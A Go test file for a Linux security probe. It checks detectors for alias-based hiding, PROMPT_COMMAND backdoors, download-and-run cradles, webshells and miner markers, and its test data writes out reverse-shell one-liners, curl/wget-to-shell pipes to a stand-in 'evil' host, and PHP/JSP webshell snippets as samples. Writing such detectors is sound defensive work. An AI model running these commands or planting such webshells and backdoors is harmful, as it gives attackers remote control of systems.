//go:build linux

package probe

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParseLockdown(t *testing.T) {
	cases := map[string]string{
		"none [integrity] confidentiality": "integrity",
		"[none] integrity confidentiality": "none",
		"none integrity [confidentiality]": "confidentiality",
		"no brackets here":                 "",
		"":                                 "",
	}
	for in, want := range cases {
		if got := parseLockdown(in); got != want {
			t.Errorf("parseLockdown(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestPathValue(t *testing.T) {
	cases := map[string]string{
		`PATH=/usr/bin:/bin`:          "/usr/bin:/bin",
		`export PATH="/usr/bin:/bin"`: "/usr/bin:/bin",
		`PATH='/opt/x:.'`:             "/opt/x:.",
		`PATH=  /a/b  `:               "/a/b",
	}
	for in, want := range cases {
		if got := pathValue(in); got != want {
			t.Errorf("pathValue(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestParseKmsg(t *testing.T) {
	e, ok := parseKmsg("6,339,5140900;usb 1-1: new high-speed USB device")
	if !ok {
		t.Fatal("parseKmsg returned ok=false for a valid record")
	}
	if e.Priority != 6 {
		t.Errorf("Priority = %d, want 6", e.Priority)
	}
	if e.Seq != 339 {
		t.Errorf("Seq = %d, want 339", e.Seq)
	}
	if e.TimestampUs != 5140900 {
		t.Errorf("TimestampUs = %d, want 5140900", e.TimestampUs)
	}
	if e.Message != "usb 1-1: new high-speed USB device" {
		t.Errorf("Message = %q", e.Message)
	}

	// continuation lines are dropped
	e, ok = parseKmsg("6,1,0;first line\n SUBSYSTEM=usb\n DEVICE=+usb")
	if !ok || e.Message != "first line" {
		t.Errorf("continuation not dropped: ok=%v msg=%q", ok, e.Message)
	}

	// no semicolon => not a record
	if _, ok := parseKmsg("garbage without semicolon"); ok {
		t.Error("parseKmsg accepted a record with no ';'")
	}

	// empty message => rejected
	if _, ok := parseKmsg("6,1,0;"); ok {
		t.Error("parseKmsg accepted an empty message")
	}
}

func TestAliasHiding(t *testing.T) {
	bad := []string{
		`alias ls='ls | grep -v evil'`,
		`alias ps='ps | egrep -v miner'`,
		`myfunc() { cat /tmp/x; }`,
		`alias cat='cat /dev/shm/hidden'`,
	}
	for _, l := range bad {
		if !aliasHiding(l) {
			t.Errorf("aliasHiding(%q) = false, want true", l)
		}
	}
	good := []string{
		`alias ls='ls --color=auto'`,
		`alias ll='ls -la'`,
		`export EDITOR=vim`,
	}
	for _, l := range good {
		if aliasHiding(l) {
			t.Errorf("aliasHiding(%q) = true, want false", l)
		}
	}
}

func TestPromptCommandBackdoor(t *testing.T) {
	bad := []string{
		`PROMPT_COMMAND='curl http://evil/x | sh'`,
		`export PROMPT_COMMAND="wget -qO- http://evil"`,
		`PROMPT_COMMAND='eval $(base64 -d <<< ...)'`,
	}
	for _, l := range bad {
		if !promptCommandBackdoor(l) {
			t.Errorf("promptCommandBackdoor(%q) = false, want true", l)
		}
	}
	good := []string{
		`PROMPT_COMMAND='history -a'`,
		`export PS1='\u@\h:\w\$ '`,
	}
	for _, l := range good {
		if promptCommandBackdoor(l) {
			t.Errorf("promptCommandBackdoor(%q) = true, want false", l)
		}
	}
}

func TestLooksLikeCradle(t *testing.T) {
	bad := []string{
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		`curl http://evil/x.sh | sh`,
		`wget -qO- http://evil/x | bash`,
		`mkfifo /tmp/f; cat /tmp/f | sh`,
		`echo cGF5bG9hZA== | base64 -d | sh`,
		`nc -e /bin/sh 10.0.0.1 4444`,
	}
	for _, l := range bad {
		if !looksLikeCradle(l) {
			t.Errorf("looksLikeCradle(%q) = false, want true", l)
		}
	}
	good := []string{
		`# curl http://example.com | sh   (commented out)`,
		`echo hello world`,
		``,
		`apt-get update`,
	}
	for _, l := range good {
		if looksLikeCradle(l) {
			t.Errorf("looksLikeCradle(%q) = true, want false", l)
		}
	}
}

func TestWebshellHit(t *testing.T) {
	bad := []string{
		`<?php system($_GET['cmd']); ?>`,
		`<?php eval($_POST['x']); ?>`,
		`<% Runtime.getRuntime().exec(request.getParameter("c")); %>`,
		`passthru($_REQUEST['c']);`,
	}
	for _, l := range bad {
		if !webshellHit(l) {
			t.Errorf("webshellHit(%q) = false, want true", l)
		}
	}
	good := []string{
		`<?php echo "hello"; ?>`,
		`$x = system_config();`, // "system" but not the system() sink with taint
		`// eval is dangerous`,
	}
	for _, l := range good {
		if webshellHit(l) {
			t.Errorf("webshellHit(%q) = true, want false", l)
		}
	}
}

func TestFileToolMarker(t *testing.T) {
	dir := t.TempDir()

	// a file containing a known offensive-tool marker
	xmrig := filepath.Join(dir, "miner")
	if err := os.WriteFile(xmrig, []byte("built with github.com/xmrig/xmrig\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fi, _ := os.Stat(xmrig)
	if got := fileToolMarker(xmrig, fi.Size()); got != "xmrig" {
		t.Errorf("fileToolMarker(xmrig) = %q, want xmrig", got)
	}

	// a benign file
	benign := filepath.Join(dir, "hello")
	if err := os.WriteFile(benign, []byte("just a normal file\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fi, _ = os.Stat(benign)
	if got := fileToolMarker(benign, fi.Size()); got != "" {
		t.Errorf("fileToolMarker(benign) = %q, want empty", got)
	}

	// zero size and oversized are skipped
	if got := fileToolMarker(benign, 0); got != "" {
		t.Errorf("fileToolMarker with size 0 = %q, want empty", got)
	}
	if got := fileToolMarker(benign, 200<<20); got != "" {
		t.Errorf("fileToolMarker with oversize = %q, want empty", got)
	}
}
